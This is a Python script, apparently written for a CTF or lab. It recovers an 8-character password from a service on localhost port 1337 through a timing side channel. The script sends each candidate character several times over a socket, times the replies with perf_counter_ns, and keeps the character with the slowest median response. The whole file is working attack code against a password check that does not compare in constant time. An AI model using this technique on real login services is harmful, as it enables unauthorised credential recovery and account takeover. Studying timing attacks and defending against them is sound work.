import socket
import time
import string
import statistics

from operator import itemgetter

N = 10
PWD_LEN = 8
CHARSET = string.ascii_lowercase + string.digits
CONN = ("127.0.0.1", 1337)


class PasswordFound(Exception):
  def __init__(self, password):
    self.password = password


def attempt(password: str):
  conn.sendall(password.encode() + b"\n")
  res = conn.recv(1024).decode().strip()
  if "Correct!" in res:
    print(res)
    return True
  else:
    return False
  

def get_attempt_timings(password):
  timings = []

  for i in range(N):
    before = time.perf_counter_ns()
    res = attempt(password)
    after = time.perf_counter_ns()

    if res:
      raise PasswordFound(password)
    
    timings.append(after - before)

  return timings


def find_next_char(prefix):
  measures = []

  print(f"Trying to find next char for prefix {prefix}")
  for i, char in enumerate(CHARSET):
    timings = get_attempt_timings(prefix + char + "0" * (PWD_LEN - len(prefix) - 1))

    median = statistics.median(timings)
    min_ = min(timings)
    max_ = max(timings)
    stdev = statistics.stdev(timings)

    measures.append(
      {
        "char": char,
        "median": median,
        "min": min_,
        "max": max_,
        "stdev": stdev,
      }
    )

  measures = sorted(measures, key=itemgetter("median"), reverse=True)

  found = measures[0]
  top = measures[1:4]

  print(f"Found char {found['char']} with median {found['median']}")
  print(f"Median: {found['median']} Max: {found['max']} Min: {found['min']} Stdev: {found['stdev']}")

  print()
  print("Top 3:")
  for top_char in top:
    ratio = int((1 - (top_char['median'] / found['median'])) * 100)
    print(f"Char: {top_char['char']} Median: {top_char['median']} Max: {top_char['max']} Min: {top_char['min']} Stdev: {top_char['stdev']} ({ratio}% slower)")

  return found['char']


def main():
  base = ""

  try:
    while len(base) != PWD_LEN:
      base += find_next_char(base)
      print("\n")
  except PasswordFound as e:
    print(f"Found password: {e.password}")
    exit(0)
  else:
    print("Password not found")
    exit(1)


if __name__ == "__main__":
  conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  conn.connect(CONN)
  print(conn.recv(1024).decode().strip())
  main()